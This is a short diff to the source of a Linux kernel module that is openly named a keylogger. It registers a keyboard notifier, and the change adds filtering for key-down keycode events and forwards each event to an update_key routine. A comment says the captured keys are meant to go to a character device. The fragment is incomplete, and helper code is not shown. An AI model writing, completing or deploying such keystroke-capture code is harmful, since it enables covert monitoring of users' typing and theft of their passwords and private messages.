@@ -18,13 +18,15 @@ static struct file_operations fops =
 int notifier(struct notifier_block *block, unsigned long code, void *p)
 {
     struct keyboard_notifier_param *param;
-    param =p;
+    param =(struct keyboard_notifier_param*) p;
+    int key;
     /*needs to conect to the char dvice*/
-    if (param->down){
-        update_key(*param);
-        msg_Ptr=NULL;
+    if (code == KBD_KEYCODE && param->down)
+    {
+        key = param->value; 
+        update_key(p);
     }
-
+    return NOTIFY_OK;
 }
 static struct notifier_block keylogger ={.notifier_call = notifier};
 
